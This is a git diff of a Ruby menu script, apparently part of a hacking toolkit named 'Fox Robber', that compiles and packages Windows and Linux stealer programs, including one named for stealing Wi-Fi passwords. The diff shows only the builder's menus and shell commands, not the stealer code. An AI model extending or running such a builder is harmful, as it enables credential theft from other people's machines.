@@ -1,5 +1,7 @@
 require 'colorize'
+
 $error = 'This command is not true'
+
 module All
   class Explain
     def explain
@@ -44,13 +46,14 @@ while true
             case command_fox_robber
             when '4', 'windows'
               system('clear')
-              puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back".green
+              puts "What do you want:\n[9]. Python\n[10]. Ruby\n[11]. C++\n[0]. Back".green
               job = 'fox-robber [windows]'
               print "\n(#{job})>".yellow
               command_windows = gets.chomp
               case command_windows
-              when '9', 'steal-wifi-password'
+              when '11', 'c++', 'cpp', 'cxx'
                 puts 'Loading...'.blue
+                ### Need More work ###
                 system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
                 system('mv a.out Windows_Steal_WIFI_password')
                 system('chmod -r+x Windows_Steal_WIFI_password')
@@ -80,9 +83,7 @@ while true
             when '9', 'python'
               puts 'Loading...'.blue
               system('cp Linux/Robber.py Out')
-
-              ### Encoding ###
-
+              system('chmod -r+x Out/Robber.py')
               puts 'File made by Fox Robber 🦊'.red
               system("echo \"\t<Press enter>\" | lolcat -a")
               gets.chomp
